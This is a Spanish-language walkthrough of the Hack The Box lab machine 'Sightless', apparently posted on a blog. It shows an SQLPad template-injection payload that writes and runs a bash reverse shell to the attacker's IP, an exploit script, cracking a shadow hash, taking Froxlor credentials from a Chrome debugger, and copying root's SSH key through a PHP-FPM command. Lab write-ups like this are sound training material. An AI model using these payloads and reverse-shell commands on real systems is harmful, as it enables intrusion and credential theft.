---
title: Sightless
description: Sightless es una máquina Linux de dificultad fácil que presenta un sitio web para una empresa que ofrece varios servicios. La enumeración del sitio web revela una instancia de SQLPad vulnerable a template injection CVE-2022-0944, que se aprovecha para afianzarse dentro de un contenedor Docker. Una enumeración adicional revela el archivo /etc/shadow con un hash, que se descifra para revelar la contraseña, lo que otorga acceso SSH al host. La enumeración posterior a la explotación revela una instancia de Froxlor vulnerable a Blind XSS CVE-2024-34070. Esto se aprovecha para obtener acceso al servicio FTP, que contiene una base de datos KeePass. El acceso a la base de datos revela las claves SSH raíz, lo que lleva a un shell privilegiado en el host.
date: 2024-09-17
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-sightless/sightless_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - ftp
  - ssh
  - http
  - tcp
  - devtools
  - chromium
  - ssti
  - cve
  - rce
  - os_command_injection
  - password_attacks
  - port_forwarding
  - information_gathering
  - web_analysis
  - foothold
  - escaping_docker
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/sightless:-$ ping -c 1 10.10.11.32
PING 10.10.11.32 (10.10.11.32) 56(84) bytes of data.
64 bytes from 10.10.11.32: icmp_seq=1 ttl=63 time=302 ms

--- 10.10.11.32 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 302.056/302.056/302.056/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/sightless:-$ sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.11.32 -oG map1
Host: 10.10.11.32 ()    Status: Up
Host: 10.10.11.32 ()    Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///   Ignored State: closed (65532)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/sightless:-$ sudo nmap -sCV -p21,22,80 -vvv 10.10.11.32 -oN map2
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGoivagBalUNqQKPAE2WFpkFMj+vKwO9D3RiUUxsnkBNKXp5ql1R+kvjG89Iknc24EDKuRWDzEivKXYrZJE9fxg=
|   256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA4BBc5R8qY5gFPDOqODeLBteW5rxF+qR5j36q9mO+bu
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.95%I=7%D=1/21%Time=678FC9A3%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20Ser
SF:ver\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20try
SF:\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20b
SF:eing\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/htb/machines/sightless:-$ echo '10.10.11.32\tsightless.htb' | sudo tee -a /etc/hosts
```
```terminal
/home/kali/Documents/htb/machines/sightless:-$ whatweb sightless.htb
http://sightless.htb [200 OK] Country[RESERVED][ZZ], Email[sales@sightless.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.32], Title[Sightless.htb], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

---
## Web Analysis

Al acceder a la página web inicial, se presenta un diseño simple, sin muchas opciones disponibles.

![](assets/img/htb-writeup-sightless/sightless1_1.png)

Durante la inspección, al hacer hovering sobre el botón `Start Now` de SQLPad, se observa un subdirectorio en el enlace del botón.

![](assets/img/htb-writeup-sightless/sightless1_2.png)

```terminal
/home/kali/Documents/htb/machines/sightless:-$ sudo sed -i '$d' /etc/hosts
/home/kali/Documents/htb/machines/sightless:-$ echo '10.10.11.32\tsightless.htb\tsqlpad.sightless.htb' | sudo tee -a /etc/hosts
```

Me encuentro con el servicio Sqlpad en su versión 6.10.0. Este servicio es vulnerable a RCE [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944).

![](assets/img/htb-writeup-sightless/sightless1_3.png)
![](assets/img/htb-writeup-sightless/sightless1_4.png)

---
## Foothold

NIST hace referencia a un [PoC](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb) publicado en huntr.

A. Preparar la primera conexión

La explotación comienza creando una conexión maliciosa en Sqlpad.

* Connection name: test
* Driver: MySQL
* Database: Inserto el siguiente código

```javascript
{\{ process.mainModule.require('child_process').exec('echo "#!/bin/bash\nbash -i >& /dev/tcp/10.10.16.36/4321 0>&1" > /tmp/exploit.sh') }}
```
> Nota: Se debe eliminar la barra invertida `\`
{: .prompt-warning }

Este código crea un script en el sistema objetivo que, al ejecutarse, inicia una conexión inversa hacia mi máquina.

![](assets/img/htb-writeup-sightless/sightless1_5.png)

B. Ponerse en escucha

Desde mi máquina atacante, configuro un listener usando netcat.

```terminal
/home/kali/Documents/htb/machines/sightless:-$ nc -nlvp 4321
	listening on [any] 4321 ...
```

C. Activar el exploit

Creo una segunda conexión maliciosa en Sqlpad.

* Connection name: exploit
* Driver: MySQL
* Database: Inserto el siguiente código

```javascript
{\{ process.mainModule.require('child_process').exec('/bin/bash /tmp/exploit.sh') }}
```
> Nota: Se debe eliminar la barra invertida `\`
{: .prompt-warning }

![](assets/img/htb-writeup-sightless/sightless1_6.png)

El payload ejecuta el script `/tmp/exploit.sh`, que inicia una conexión inversa a mi máquina atacante.

![](assets/img/htb-writeup-sightless/sightless1_7.png)


---
## Foothold 2

Una alternativa más eficiente para explotar esta vulnerabilidad es utilizando es siguiente [exploit](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944).

```terminal
/home/kali/Documents/htb/machines/sightless:-$ wget https://raw.githubusercontent.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944/refs/heads/main/exploit.py
```
```terminal
/home/kali/Documents/htb/machines/sightless:-$ nc -nlvp 4321
	listening on [any] 4321 ...
```

Ejecuto el exploit especificando la URL del servicio vulnerable y mi dirección IP con el puerto en escucha.

```terminal
/home/kali/Documents/htb/machines/sightless:-$ python exploit.py http://sqlpad.sightless.htb/ 10.10.16.68 4321
Response status code: 400
Response body: {"title":"connect ECONNREFUSED 127.0.0.1:3306"}
Exploit sent, but server responded with status code: 400. Check your listener.

	... connect to [10.10.16.36] from (UNKNOWN) [10.10.11.32] 37320

root@c184118df0a6:/var/lib/sqlpad# whoami
root
```

---
## Escaping Docker

Tras obtener acceso al contenedor como usuario `root`, busco en el archivo `/etc/shadow` para identificar posibles contraseñas encriptadas de usuarios del host.

```terminal
root@c184118df0a6:/# cat /etc/shadow
```

![](assets/img/htb-writeup-sightless/sightless1_8.png)

Encuentro el hash de la contraseña del usuario `michael`. El hash está en el formato `$6$salt$hash`, indicando el uso del algoritmo SHA-512 junto con `salt`.

```terminal
/home/kali/Documents/htb/machines/sightless:-$ echo '$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/' > aa1hash.txt
```

Identifico el modo correcto de Hashcat para hashes de tipo sha512crypt (Unix).

```terminal
/home/kali/Documents/htb/machines/sightless:-$ hashcat --show aa1hash.txt
   # | Name                                            | Category
=====+=================================================+==============================
1800 | sha512crypt $6$, SHA512 (Unix)                  | Operating System
```
```terminal
/home/kali/Documents/htb/machines/sightless:-$ hashcat -m 1800 -a 0 aa1hash.txt /usr/share/wordlists/rockyou.txt
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
```

Obtengo la contraseña `insaneclownposse` y la uso para conectarme al usuario `michael` mediante SSH en la máquina objetivo.

```terminal
/home/kali/Documents/htb/machines/sightless:-$ ssh michael@10.10.11.32
michael@10.10.11.32's password: insaneclownposse

michael@sightless:~$ cat user.txt
```

---
## Privilege Escalation

```terminal
michael@sightless:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
michael:x:1000:1000:michael:/home/michael:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/bash
```

Encuentro varios puertos funcionando, entre ellos el 8080 que puede estar corriendo un servicio.

```terminal
michael@sightless:~$ ss -tulnp
```

![](assets/img/htb-writeup-sightless/sightless2_1.png)

El archivo `/etc/hosts` revela un subdominio funcionando en local.

```terminal
michael@sightless:~$ cat /etc/hosts
```
![](assets/img/htb-writeup-sightless/sightless2_2.png)

Para acceder al servicio en el puerto 8080, realizo un túnel SSH.

```terminal
/home/kali/Documents/htb/machines/sightless:-$ ssh -L 8080:127.0.0.1:8080 michael@sightless.htb -N -f
michael@sightless.htb's password: insaneclownposse
```

Accedo al servicio Froxlor mediante el navegador, encontrando un formulario de inicio de sesión.

![](assets/img/htb-writeup-sightless/sightless2_3.png)


Utilizo una técnica para obtener información sensible desde el depurador remoto de Chrome.

Referencia: [Chrome Remote Debugger Pentesting](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/).

![](assets/img/htb-writeup-sightless/sightless2_4.png)

En `chrome://inspect/#devices`, agregué los puertos mas altos uno por uno en el formato localhost:puerto.

En mi caso el puerto clave es el `39303`.

![](assets/img/htb-writeup-sightless/sightless2_5.png)

Después de la configuración, ejecuté el port-forwarding de los puertos locales.

Uno de los puertos que añadí fue `localhost:39303`, el cual me permitió acceder al Remote Target.

```terminal
/home/kali/Documents/htb/machines/sightless:-$ ssh -L 39303:127.0.0.1:39303 michael@sightless.htb
michael@sightless.htb's password: insaneclownposse
```

Bajo el apartado Remote Target, apareció la página local del servicio Froxlor.
Hice clic en `Inspect` para abrir el DevTools de la página.

![](assets/img/htb-writeup-sightless/sightless2_6.png)

En el DevTools, reviso la pestaña `Network`.

Analizo las solicitudes de la página `index.php`.

En la sección `Payload`, obtengo credenciales en texto plano: `admin:ForlorfroxAdmin`.

![](assets/img/htb-writeup-sightless/sightless2_7.png)

Una vez obtenidas las credenciales de administrador de Froxlor, pude acceder al admin dashboard de Froxlor.

Durante la revisión, encontré una posible vulnerabilidad RCE en la sección de versiones de PHP-FPM.

Navegué a `PHP` > `PHP-FPM Versions` y allí creé una nueva versión de PHP `Create new PHP Version`. En la opción `php-fpm restart command`, agregué el siguiente comando: `cp /root/.ssh/id_rsa /tmp/id_rsa`.

Esto copiaría la clave privada de `root` al directorio `/tmp`.

![](assets/img/htb-writeup-sightless/sightless3_1.png)
![](assets/img/htb-writeup-sightless/sightless3_2.png)

Para que el cambio surta efecto, fui a `System` > `Settings`, active la opcion `Eneable php-fpm` y guardé la configuración.

![](assets/img/htb-writeup-sightless/sightless3_3.png)

Al revisar el directorio `/tmp`, encontré el archivo `id_rsa` que había sido copiado.

```terminal
michael@sightless:/tmp$ ls -al
```

![](assets/img/htb-writeup-sightless/sightless3_4.png)

Luego edité la configuración anterior para ejecutar el siguiente comando: `chmod 644 /tmp/id_rsa`.

![](assets/img/htb-writeup-sightless/sightless3_5.png)

Esto me permitió cambiar los permisos del archivo `id_rsa` para que pudiera leerlo.

```terminal
michael@sightless:/tmp$ ls -al
```

![](assets/img/htb-writeup-sightless/sightless3_6.png)

Ahora pude acceder al archivo y copiarlo para acceder como `root` al servidor.

```terminal
/home/kali/Documents/htb/machines/sightless:-$ chmod 600 id_rsa

/home/kali/Documents/htb/machines/sightless:-$ ssh -i id_rsa root@10.10.11.32

root@sightless:~# cat /root/root.txt
```

> <a href="https://labs.hackthebox.com/achievement/machine/1521382/624" target="_blank">***Litio7 has successfully solved Sightless from Hack The Box***</a>
{: .prompt-info style="text-align:center" }
